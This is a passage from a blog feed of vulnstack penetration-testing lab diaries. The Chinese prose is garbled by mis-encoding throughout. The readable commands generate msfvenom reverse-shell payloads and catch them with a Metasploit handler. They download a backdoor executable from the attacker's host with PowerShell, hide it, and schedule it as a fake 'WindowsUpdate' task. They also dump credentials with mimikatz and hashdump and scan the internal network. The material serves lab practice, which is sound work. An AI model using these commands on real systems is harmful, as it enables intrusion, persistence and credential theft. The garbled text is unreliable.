title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h5><p><code>cve_2016_0638</code> å’Œ <code>cve_2016_3510</code> éƒ½å¯ç”¨æ¥å‘½ä»¤æ‰§è¡Œï¼Œå¼¹ä¸ªshellå…ˆ</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># kali</span><br>msfvenom -p cmd/windows/reverse_powershell <span class="hljs-attribute">LHOST</span>=192.168.111.128 <span class="hljs-attribute">LPORT</span>=4444<br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload cmd/windows/reverse_powershell<br><span class="hljs-built_in">set</span> LHOST 192.168.111.128<br>run<br></code></pre></td></tr></table></figure><p>å°†ç”Ÿæˆçš„payloadåœ¨å·¥å…·å‘½ä»¤æ¡†æ‰§è¡Œï¼Œæ‹¿åˆ°cmdshellï¼Œé¡ºæ‰‹çœ‹ä¸€çœ¼systeminfo<img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204160314050.png" alt="image-20231204160314050"><img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204170125566.png" alt="image-20231204170125566"></p><p>â‘  å¯ä»¥æ‹¿å»ææƒè¾…åŠ©å·¥å…·æœæ¼æ´</p><p>â‘¡ å‘ç°å†…ç½‘åœ°å€</p><h4 id="åæ¸—é€"><a href="#åæ¸—é€" class="headerlink" title="åæ¸—é€"></a>åæ¸—é€</h4><h5 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h5><p>å…ˆæŠŠshellè½¬ä¸ºmeterpreter_shell</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment"># shell</span><br>[ctrl + z] å½“å‰ä¼šè¯æŒ‚åå°<br><br><span class="hljs-comment"># msf</span><br>sessions æŸ¥çœ‹ä¼šè¯<span class="hljs-built_in">id</span><br>use post/multi/manage/shell_to_meterpreter<br><span class="hljs-keyword">set</span> session <span class="hljs-number">3</span>(shellçš„ä¼šè¯<span class="hljs-built_in">id</span>)<br><span class="hljs-built_in">run</span><br>sessions æŸ¥çœ‹ä¼šè¯<span class="hljs-built_in">id</span><br>sessions -i <span class="hljs-number">4</span>(æ–°çš„ä¼šè¯<span class="hljs-built_in">id</span>)<br><br><span class="hljs-comment"># meterpreter</span><br>getsystem<br>ææƒæˆåŠŸ<br>ps<br>migrate è¿ç§»åˆ°ä¸€ä¸ªç¨³å®šçš„è¿›ç¨‹<br></code></pre></td></tr></table></figure><p><img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204160842752.png" alt="image-20231204160842752"></p><h5 id="æƒé™ç»´æŒ"><a href="#æƒé™ç»´æŒ" class="headerlink" title="æƒé™ç»´æŒ"></a>æƒé™ç»´æŒ</h5><p>åšä¸ªcsçš„é©¬å­ï¼Œä¸Šä¼ -&gt;éšè—-&gt;è®¡åˆ’ä»»åŠ¡ ä¸€æ¡é¾™ï¼Œä¸Šçº¿cs</p><p>åŸŸæ§é‡Œå‡ºåœºç‡å¾ˆé«˜çš„ä¸€ä¸ªè¯å« <strong>é»„é‡‘ç¥¨æ®</strong> ï¼Œå›å¤´å­¦ä¹ ä¸€ä¸‹å†åˆ©ç”¨</p><p>ç”¨msfçš„kiwiæŸ¥æŸ¥å¯†ç </p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta"># meterpreter</span><br>load kiwi<br>help kiwi<br>kiwi_cmd sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure><h5 id="å…³æ‰é˜²ç«å¢™"><a href="#å…³æ‰é˜²ç«å¢™" class="headerlink" title="å…³æ‰é˜²ç«å¢™"></a>å…³æ‰é˜²ç«å¢™</h5><h4 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h4><h5 id="å†…ç½‘æ”¶é›†1-cs"><a href="#å†…ç½‘æ”¶é›†1-cs" class="headerlink" title="å†…ç½‘æ”¶é›†1 - cs"></a>å†…ç½‘æ”¶é›†1 - cs</h5><p>åˆ©ç”¨cså·²ä¸Šçº¿çš„é¶æœºæ‰«æå†…ç½‘å­˜æ´»ä¸»æœº</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># cs beacon</span><br><span class="hljs-attribute">portscan</span> <span class="hljs-number">10.10.10.1</span>-<span class="hljs-number">10.10.10.255</span> <span class="hljs-number">445</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">80</span>,<span class="hljs-number">443</span> arp <span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p><img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231205161854262.png" alt="image-20231205161854262"></p><p>å­˜æ´»ä¸»æœº <code>10, 80(å½“å‰é¶æœº), 201</code></p><h5 id="å†…ç½‘æ”¶é›†2-msf"><a href="#å†…ç½‘æ”¶é›†2-msf" class="headerlink" title="å†…ç½‘æ”¶é›†2 - msf"></a>å†…ç½‘æ”¶é›†2 - msf</h5><p>msfæŒ‚ä¸ªè·¯ç”±</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># meterpreter</span><br><span class="hljs-attribute">run</span> autoroute -s <span class="hljs-number">10.10.10.0</span>/<span class="hljs-number">24</span><br><span class="hljs-attribute">bg</span><br></code></pre></td></tr></table></figure><p>ç”¨msfæ‰«ä¸€ä¸‹å¼€æ”¾çš„ç«¯å£</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># msf</span><br><span class="hljs-attribute">search</span> portscan<br><span class="hljs-attribute">use</span> auxiliary/scanner/portscan/tcp<br><span class="hljs-attribute">set</span> rhost <span class="hljs-number">10.10.10.10</span>(<span class="hljs-number">10.10.10.201</span>)<br><span class="hljs-attribute">set</span> ports <span class="hljs-number">1</span>-<span class="hljs-number">10000</span>(é»˜è®¤)<br><span class="hljs-attribute">set</span> concurrency <span class="hljs-number">1000</span>(ç«¯å£æ‰«æé€Ÿåº¦ï¼Œé»˜è®¤<span class="hljs-number">10</span>ï¼Œæ”¹<span class="hljs-number">1000</span>ç›´æ¥èµ·é£~)<br><span class="hljs-attribute">run</span><br></code></pre></td></tr></table></figure><p><img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231205165146786.png" alt="image-20231205165146786"><img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231205170345103.png" alt="image-20231205170345103"></p><h5 id="å†…ç½‘æ”¶é›†3-fscan"><a href="#å†…ç½‘æ”¶é›†3-fscan" class="headerlink" title="å†…ç½‘æ”¶é›†3 - fscan"></a>å†…ç½‘æ”¶é›†3 - fscan</h5><p><code>kernel32.dll not found</code> å¥‡äº†æ€ªäº†ï¼Œæ˜æ˜æœ‰è¿™ä¸ªåŠ è½½åº“ï¼Œä½†æ˜¯å¯åŠ¨ä¸èµ·æ¥ï¼ŒæŸ¥äº†å¾ˆå¤šè§£å†³æ–¹æ³•éƒ½ä¸è¡Œï¼Œä¸Šæ¬¡ä¹Ÿæ˜¯è¿™ä¸ªé—®é¢˜ï¼Œå…ˆæç½®ã€‚</p><p>å¥½å®¶ä¼™ï¼Œç™»å½•ä¸ä¸Šï¼Œæœºå­åˆæ—¥åäº†ï¼Œå“</p><p>å‰©ä¸‹çš„å¤§æ¦‚å°±æ˜¯æ‰¾ä¸€ä¸‹æ¼æ´ç„¶ååˆ©ç”¨(æ°¸æ’ä¹‹è“ä¹‹ç±»çš„ï¼Œæ²¡å•¥æ–°å¥‡)</p>]]></content>
    
    
    
    <tags>
      
      <tag>è§£é¢˜è®°å½•</tag>
      
      <tag>å­¦ä¹ </tag>
      
      <tag>vulnstack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnstacké¶åœºæ—¥è®°-1</title>
    <link href="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/"/>
    <url>/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h3 id="å…³äºvulnstack"><a href="#å…³äºvulnstack" class="headerlink" title="å…³äºvulnstack"></a>å…³äºvulnstack</h3><p>å›½å†…çš„æ¸—é€æµ‹è¯•é¶åœºï¼Œç”±çº¢æ—¥å®‰å…¨å›¢é˜Ÿæ‰“é€ ã€‚</p><p>å–è¯¾çš„ï¼Œä½†æ˜¯é¶åœºç”¨æ¥ç»ƒæ‰‹è¿˜ä¸é”™ã€‚</p><p>ç›®å‰å…±æœ‰å…«ä¸ªé¶åœºï¼Œæœ€å¤§çš„60ä¸ªGï¼Œå°çš„ä¹Ÿæœ‰20å¤šä¸ªGï¼Œæ¨¡æ‹Ÿä»å¤–ç½‘åˆ°å†…ç½‘çš„è¿‡ç¨‹ï¼Œ<a href="http://vulnstack.qiyuanxuetang.net/vuln/">é“¾æ¥</a></p><p>ç”±äºæ¯ä¸ªé¶åœºéƒ½æ˜¯å•ç‹¬çš„ç¯å¢ƒï¼Œä¸åªå±€é™äºæŸä¸ªç‰¹å®šæ¼æ´ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨ [é¶åœº+åºå·] çš„å½¢å¼å‘½å</p><h3 id="é¶åœºä¸€"><a href="#é¶åœºä¸€" class="headerlink" title="é¶åœºä¸€"></a>é¶åœºä¸€</h3><h4 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h4><ol><li>ä¸‹è½½åè§£å‹ï¼Œå…±æœ‰ä¸‰å°æœºå­ win7ã€win2003ã€winserver 2008 R2ï¼Œé»˜è®¤å¯†ç  <code>hongrisec@2019</code>ï¼Œä½†æ˜¯æˆ‘çš„2003å¯†ç é”™è¯¯ç™»ä¸ä¸Šï¼ŒIPåœ°å€éœ€è¦è‡ªå·±æ‰¾</li><li>æ”»å‡»æœº kali</li><li>win7 åˆ©ç”¨phpstudyæ‰“å¼€ç½‘ç»œæœåŠ¡(å¯ä»¥ç”¨everythingæœç´¢phpstudy)ï¼Œæœ¬æœºå°è¯•è®¿é—® <code>http://127.0.0.1</code> æ£€æŸ¥æ˜¯å¦å¼€å¯</li></ol><h4 id="ç½‘ç»œç¯å¢ƒ"><a href="#ç½‘ç»œç¯å¢ƒ" class="headerlink" title="ç½‘ç»œç¯å¢ƒ"></a>ç½‘ç»œç¯å¢ƒ</h4><p>éœ€è¦æ­å»ºä¸¤ä¸ªå±€åŸŸç½‘ï¼Œæˆ‘ä½¿ç”¨çš„VMwareï¼Œæ·»åŠ ä¸¤ä¸ªç½‘ç»œé€‚é…å™¨(åŸæœ‰çš„NETåŠ ä»»æ„VMnet)ï¼Œæ­¤å¤„æˆ‘ä½¿ç”¨net åŠ  VMnet2ï¼Œå¦‚å›¾</p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130144157472.png" alt="image-20231130144157472"><p>å…¶ä¸­ï¼Œkali å’Œ win7 æ¥å…¥NETï¼Œæ¨¡æ‹Ÿå¤–ç½‘ï¼Œwin7ã€win2003ã€win server 2008 æ¥å…¥ VMnet2ï¼Œæ¨¡æ‹Ÿå†…ç½‘</p><h5 id="å¤–ç½‘"><a href="#å¤–ç½‘" class="headerlink" title="å¤–ç½‘"></a>å¤–ç½‘</h5><ul><li>kali        192.168.48.129</li><li>win7      192.168.48.138</li></ul><h5 id="å†…ç½‘"><a href="#å†…ç½‘" class="headerlink" title="å†…ç½‘"></a>å†…ç½‘</h5><ul><li>win7                       192.168.52.143</li><li>win2003                192.168.52.141(åŒç½‘æ®µè‡ªå·±æµ‹è¯•å‡ºæ¥çš„ï¼Œå› ä¸ºå¯†ç é”™è¯¯ç™»é™†ä¸ä¸Š)</li><li>winServer             192.168.52.138</li></ul><h5 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h5><ul><li>win7 å¯ä»¥pingé€šæ‰€æœ‰ip</li><li>æ‰€æœ‰ipå‡ä¸å¯pingé€šwin7(é˜²ç«å¢™)</li><li>win2003 å’Œ winServer å¯ä»¥äº’ç›¸pingé€š</li></ul><h4 id="å¤–ç½‘æ¸—é€"><a href="#å¤–ç½‘æ¸—é€" class="headerlink" title="å¤–ç½‘æ¸—é€"></a>å¤–ç½‘æ¸—é€</h4><p>kali -&gt; win7</p><h5 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h5><ol><li><p>netdiscover å‘ç° ip 192.168.48.138ï¼Œnmap æ‰«ç«¯å£å¼€æ”¾80å’Œ3306ç«¯å£<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130150409166.png" alt="image-20231130150409166"></p></li><li><p>æµè§ˆå™¨è®¿é—®ï¼Œå‘ç°phpstudyæ¢é’ˆï¼Œåˆæ­¥æŸ¥çœ‹ï¼šå®‰å…¨æ¨¡å¼æ²¡å¼€ã€é­”æœ¯å¼•å·æ²¡å¼€ã€ç¦ç”¨å‡½æ•°ä¸ºç©ºã€mysqlå¼±å£ä»¤ <code>root  root</code> æˆåŠŸè¿æ¥ï¼Œå¯ä»¥è¯´æ¯«æ— é˜²å¤‡æ¼æ´ç™¾å‡ºäº†<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130152957440.png" alt="image-20231130152957440"><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130152929871.png" alt="image-20231130152929871"></p></li><li><p>dirbæ‰«ä¸€ä¸‹ï¼Œå‡ºäº†ä»¥ä¸‹å†…å®¹</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">phpinfo<br><span class="hljs-function"><span class="hljs-title">phpmyadmin</span><span class="hljs-params">(å¼±å£ä»¤root/root)</span></span><br>phpmyadmin/changelog phpç‰ˆæœ¬<span class="hljs-number">3.5</span>.<span class="hljs-number">8.2</span>  åˆæ­¥åˆ¤æ–­æ²¡æœ‰å¯ç›´æ¥æ‹¿shellçš„é€”å¾„<br></code></pre></td></tr></table></figure><p>åŠ åç¼€é‡æ–°æ‰«</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">dirb http:<span class="hljs-string">//192.168.48.138</span> <span class="hljs-string">/usr/share/dirb/wordlists/big.txt</span> -X <span class="hljs-string">.php</span>,<span class="hljs-string">.zip</span>,<span class="hljs-string">.7z</span>,<span class="hljs-string">.rar</span>ï¼ˆwindowså‹ç¼©æ–¹å¼ä¸ºzipã€rarï¼‰<br>å‡ºäº†ä¸ªbeifen.rar<br></code></pre></td></tr></table></figure></li><li><p>ä¸‹è½½å¹¶è§£å‹ beifen.rar ï¼Œå‘ç°yxcms(1.2.1)ç½‘ç«™æºç <img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130163455279.png" alt="image-20231130163455279"></p><p>åå°åœ°å€ <code>/yxcms/index.php?r=admin</code> é»˜è®¤å¯†ç  <code>admin/123456</code>   <img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130163739198.png" alt="image-20231130163739198"></p></li></ol><h5 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h5><ol><li><p>æˆåŠŸç™»å…¥yxcmsç®¡ç†åå°ï¼Œæœç´¢1.2.1ç‰ˆæœ¬æ¼æ´ï¼Œå‘ç°å‰å°æ¨¡æ¿å¤„å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼Œç¼–å†™ä¸Šä¼ ä¸€å¥è¯ï¼Œèšå‰‘æˆåŠŸè¿æ¥<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130165352796.png" alt="image-20231130165352796"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">48.138</span><span class="hljs-regexp">/yxcms/</span>protected<span class="hljs-regexp">/apps/</span>default<span class="hljs-regexp">/view/</span>default/shell.php<br></code></pre></td></tr></table></figure><p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130165416984.png" alt="image-20231130165416984"></p></li><li><p>ç›´æ¥æ‹¿åˆ°ç”¨æˆ·æƒé™(æ­¤å¤„ä¸ºadministrator)</p></li></ol><h5 id="ææƒ1-msf-getsystem"><a href="#ææƒ1-msf-getsystem" class="headerlink" title="ææƒ1 - msf getsystem"></a>ææƒ1 - msf getsystem</h5><ol><li><p>åˆ©ç”¨Msfvenomåˆ›å»ºåé—¨ç¨‹åº</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">msfvenom -<span class="hljs-selector-tag">a</span> x86 <span class="hljs-attr">--platform</span> windows -<span class="hljs-selector-tag">p</span> windows/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">48.129</span> LPORT=<span class="hljs-number">4444</span> -<span class="hljs-selector-tag">b</span> â€œ\x00â€ -e x86/shikata_ga_nai -<span class="hljs-selector-tag">i</span> <span class="hljs-number">10</span> -f exe -o /var/www/html/safe<span class="hljs-selector-class">.exe</span><br><br>-aï¼š æŒ‡å®šæ¶æ„å¦‚x86 x64ã€‚x86ä»£è¡¨<span class="hljs-number">32</span>ä½ï¼Œx64ä»£è¡¨<span class="hljs-number">64</span>ä½ã€‚<span class="hljs-number">32</span>ä½è½¯ä»¶å¯ä»¥åœ¨<span class="hljs-number">64</span>ä½ç³»ç»Ÿä¸Šè¿è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬ç”Ÿæˆ<span class="hljs-number">32</span>ä½çš„åé—¨ï¼Œè¿™æ ·åœ¨<span class="hljs-number">32</span>ä½å’Œ<span class="hljs-number">64</span>ä½ç³»ç»Ÿä¸­éƒ½å¯ä»¥ä½¿ç”¨ã€‚<br>â€“platformï¼š æŒ‡å®šå¹³å°ï¼Œè¿™é‡Œé€‰æ‹©windowsï¼Œé€šè¿‡â€“l platformså¯ä»¥æŸ¥çœ‹æ‰€æœ‰æ”¯æŒçš„å¹³å°ã€‚<br>-<span class="hljs-selector-tag">p</span>: è®¾ç½®æ”»å‡»è½½è·ï¼Œæˆ‘ä»¬ä½¿ç”¨windows/meterpreter/reverse_tcpï¼Œå¯ä»¥é€šè¿‡-l payloadsæŸ¥çœ‹æ‰€æœ‰æ”»å‡»è½½è·ã€‚<br>**LHOST:**ç›®æ ‡ä¸»æœºæ‰§è¡Œç¨‹åºåè¿æ¥æˆ‘ä»¬Kaliçš„åœ°å€LPORTç›®æ ‡ä¸»æœºæ‰§è¡Œç¨‹åºåè¿æ¥æˆ‘ä»¬Kaliçš„ç«¯å£<br>-<span class="hljs-selector-tag">b</span>: å»æ‰åå­—ç¬¦ï¼Œåå­—ç¬¦ä¼šå½±å“payload æ­£å¸¸æ‰§è¡Œã€‚<br></code></pre></td></tr></table></figure><p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130171219723.png" alt="image-20231130171219723"></p></li><li><p>pythonå¼€å¯httpæœåŠ¡ï¼Œåœ¨winä¸Šä¸‹è½½åé—¨æ–‡ä»¶å¹¶æ‰§è¡Œï¼Œåœ¨msfä¸Šç›‘å¬</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-meta"># kali</span><br>python -m http.<span class="hljs-keyword">server</span> <span class="hljs-number">9999</span><br><br><span class="hljs-meta"># win7(é€šè¿‡èšå‰‘çš„å‘½ä»¤è¡Œæ‰§è¡Œ)</span><br>powershell (<span class="hljs-keyword">new</span>-object System.Net.WebClient).DownloadFile(<span class="hljs-string">&#x27;http://192.168.48.129:9999/safe.exe&#x27;</span>,<span class="hljs-string">&#x27;safe.exe&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># msfconsole</span><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.48.129<br><span class="hljs-built_in">set</span> lport 4444(é»˜è®¤)<br>exploit<br><br><span class="hljs-comment"># win7</span><br>è¿è¡Œsafe.exe<br></code></pre></td></tr></table></figure><p>æ¬§~äº†<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130172215581.png" alt="image-20231130172215581"></p></li><li><p>getsystemææƒ<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130172541423.png" alt="image-20231130172541423"></p></li></ol><h5 id="ææƒ2-systeminfo-ææƒè¾…åŠ©"><a href="#ææƒ2-systeminfo-ææƒè¾…åŠ©" class="headerlink" title="ææƒ2 - systeminfo + ææƒè¾…åŠ©"></a>ææƒ2 - systeminfo + ææƒè¾…åŠ©</h5><ol><li>æˆ‘ä»¬åˆ©ç”¨å‘½ä»¤è¡Œ(èšå‰‘æˆ–è€…meterpreterçš„shell)æ‰§è¡Œ <code>systeminfo</code> æŒ‡ä»¤ï¼ŒæŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯å’Œå®‰è£…çš„è¡¥ä¸</li><li>åˆ©ç”¨ææƒè¾…åŠ©ç½‘é¡µ <a href="https://i.hacking8.com/tiquan/">ææƒè¾…åŠ©ç½‘é¡µ Windowsææƒè¾…åŠ© (hacking8.com)</a> æŸ¥çœ‹å¯ç”¨çš„payload<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231201122155255.png" alt="image-20231201122155255"></li></ol><h5 id="ææƒ3-ææƒè¾…åŠ©å·¥å…·-payloadåˆ©ç”¨"><a href="#ææƒ3-ææƒè¾…åŠ©å·¥å…·-payloadåˆ©ç”¨" class="headerlink" title="ææƒ3 - ææƒè¾…åŠ©å·¥å…· + payloadåˆ©ç”¨"></a>ææƒ3 - ææƒè¾…åŠ©å·¥å…· + payloadåˆ©ç”¨</h5><p>åˆ©ç”¨ææƒè¾…åŠ©å·¥å…· <a href="https://github.com/carlospolop/PEASS-ng">carlospolop&#x2F;PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors) (github.com)</a> æŸ¥çœ‹å¯åˆ©ç”¨çš„ææƒé¡¹ï¼Œæ•™ç¨‹ï¼š <a href="https://blog.csdn.net/weixin_43571641/article/details/124374117">å…¨å¹³å°ç³»ç»Ÿææƒè¾…åŠ©å·¥å…· PEASS-ng</a> </p><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-comment"># æ­¤å¤„ç”¨çš„batæ‰§è¡Œç»“æœä¸å¸¦æœ‰å½©è‰²æ ‡æ³¨</span><br>winPEAS.bat &gt; <span class="hljs-built_in">result</span>.txt<br><span class="hljs-keyword">type</span> <span class="hljs-built_in">result</span>.txt<br></code></pre></td></tr></table></figure><p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231201131030392.png" alt="image-20231201131030392"></p><p>æ ¹æ®å¯åˆ©ç”¨çš„payloadææƒå³å¯</p><h4 id="æƒé™ç»´æŒ"><a href="#æƒé™ç»´æŒ" class="headerlink" title="æƒé™ç»´æŒ"></a>æƒé™ç»´æŒ</h4><h5 id="è®¡åˆ’ä»»åŠ¡"><a href="#è®¡åˆ’ä»»åŠ¡" class="headerlink" title="è®¡åˆ’ä»»åŠ¡"></a>è®¡åˆ’ä»»åŠ¡</h5><ol><li><p>éšè—åé—¨æ–‡ä»¶</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">attrib</span> <span class="hljs-type">C</span>:\<span class="hljs-keyword">safe</span>.exe +s +h<br><span class="hljs-meta"># +s è®¾ç½®ç³»ç»Ÿå±æ€§</span><br><span class="hljs-meta"># +h è®¾ç½®éšè—å±æ€§</span><br><span class="hljs-meta"># å–æ¶ˆéšè—æŠŠ + æ”¹ä¸º -</span><br></code></pre></td></tr></table></figure></li><li><p>åˆ›å»ºè®¡åˆ’ä»»åŠ¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /create /tn WindowsUpdate /tr <span class="hljs-string">&quot;C:\safe.exe&quot;</span> /sc minute /mo 1<br><span class="hljs-comment"># /create åˆ›å»ºä»»åŠ¡</span><br><span class="hljs-comment"># /tn TaskName ä»»åŠ¡åç§°</span><br><span class="hljs-comment"># /tr TaskRun æ–‡ä»¶è·¯å¾„</span><br><span class="hljs-comment"># /sc schedule æ—¶é—´å•ä½</span><br><span class="hljs-comment"># /mo æ—¶é—´æ•°å€¼</span><br><br><span class="hljs-comment"># åˆ é™¤å‘½ä»¤</span><br>schtasks /delete /tn WindowsUpdate<br></code></pre></td></tr></table></figure></li></ol><h5 id="csè‡ªåŠ¨åŒ–æ’ä»¶"><a href="#csè‡ªåŠ¨åŒ–æ’ä»¶" class="headerlink" title="csè‡ªåŠ¨åŒ–æ’ä»¶"></a>csè‡ªåŠ¨åŒ–æ’ä»¶</h5><p><a href="https://cloud.tencent.com/developer/article/1484238">CobaltStrikeæƒé™ç»´æŒåŠå…¶è‡ªåŠ¨åŒ–-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com)</a></p><h5 id="æ›´å¤šç»´æƒæŠ€å·§"><a href="#æ›´å¤šç»´æƒæŠ€å·§" class="headerlink" title="æ›´å¤šç»´æƒæŠ€å·§"></a>æ›´å¤šç»´æƒæŠ€å·§</h5><p><a href="https://www.freebuf.com/articles/system/229209.html">æƒé™ç»´æŒåŠåé—¨æŒä¹…åŒ–æŠ€å·§æ€»ç»“ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><h4 id="å¯†ç æ”¶é›†"><a href="#å¯†ç æ”¶é›†" class="headerlink" title="å¯†ç æ”¶é›†"></a>å¯†ç æ”¶é›†</h4><h5 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h5><p>ä½¿ç”¨msfçš„hashdumpåŠŸèƒ½ï¼Œå¯ç›´æ¥è·å–ç”¨æˆ·å¯†ç çš„md5å€¼<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231201153045335.png" alt="image-20231201153045335"></p><h5 id="Mimikatz"><a 